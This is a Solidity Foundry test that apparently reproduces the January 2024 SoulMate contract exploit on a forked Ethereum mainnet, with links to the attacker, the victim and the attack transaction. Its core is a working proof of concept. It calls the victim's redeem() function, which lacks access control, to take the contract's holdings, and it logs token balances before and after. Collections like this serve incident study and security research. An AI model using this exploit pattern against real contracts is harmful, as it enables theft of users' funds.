// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$319K
// Attacker : https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd
// Attack Contract : https://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd
// Victim Contract : https://etherscan.io/address/0x82c063afefb226859abd427ae40167cb77174b68
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x1ea0a2e88efceccb2dd93e6e5cb89e5421666caeefb1e6fc41b68168373da342

// @Analysis
// https://twitter.com/MetaSec_xyz/status/1749743245599617282

interface ISoulMateContract {
    function redeem(uint256 _shares, address _receiver) external;
}

contract ContractTest is Test {
    ISoulMateContract private constant SoulMateContract = ISoulMateContract(0x82C063AFEFB226859aBd427Ae40167cB77174b68);
    IERC20 private constant BUI = IERC20(0xb7470Fd67e997b73f55F85A6AF0DeB2c96194885);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant MATIC = IERC20(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0);
    IERC20 private constant AAVE = IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);
    IERC20 private constant ENS = IERC20(0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72);
    IERC20 private constant ZRX = IERC20(0xE41d2489571d322189246DaFA5ebDe1F4699F498);
    IERC20 private constant UNI = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);

    function setUp() public {
        vm.createSelectFork("mainnet", 19063676);
        vm.label(address(SoulMateContract), "SoulMateContract");
        vm.label(address(BUI), "BUI");
        vm.label(address(USDC), "USDC");
        vm.label(address(DAI), "DAI");
        vm.label(address(MATIC), "MATIC");
        vm.label(address(AAVE), "AAVE");
        vm.label(address(ENS), "ENS");
        vm.label(address(ZRX), "ZRX");
        vm.label(address(UNI), "UNI");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter USDC balance before attack",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter DAI balance before attack",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter MATIC balance before attack",
            MATIC.balanceOf(address(this)),
            MATIC.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter AAVE balance before attack",
            AAVE.balanceOf(address(this)),
            AAVE.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter ENS balance before attack",
            ENS.balanceOf(address(this)),
            ENS.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter ZRX balance before attack",
            ZRX.balanceOf(address(this)),
            ZRX.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter UNI balance before attack",
            UNI.balanceOf(address(this)),
            UNI.decimals()
        );

        // No access control
        SoulMateContract.redeem(BUI.balanceOf(address(SoulMateContract)), address(this));

        emit log_named_decimal_uint(
            "Exploiter USDC balance after attack",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );
        emit log_named_decimal_uint("Exploiter DAI balance after attack", DAI.balanceOf(address(this)), DAI.decimals());
        emit log_named_decimal_uint(
            "Exploiter MATIC balance after attack",
            MATIC.balanceOf(address(this)),
            MATIC.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter AAVE balance after attack",
            AAVE.balanceOf(address(this)),
            AAVE.decimals()
        );
        emit log_named_decimal_uint("Exploiter ENS balance after attack", ENS.balanceOf(address(this)), ENS.decimals());
        emit log_named_decimal_uint("Exploiter ZRX balance after attack", ZRX.balanceOf(address(this)), ZRX.decimals());
        emit log_named_decimal_uint("Exploiter UNI balance after attack", UNI.balanceOf(address(this)), UNI.decimals());
    }
}
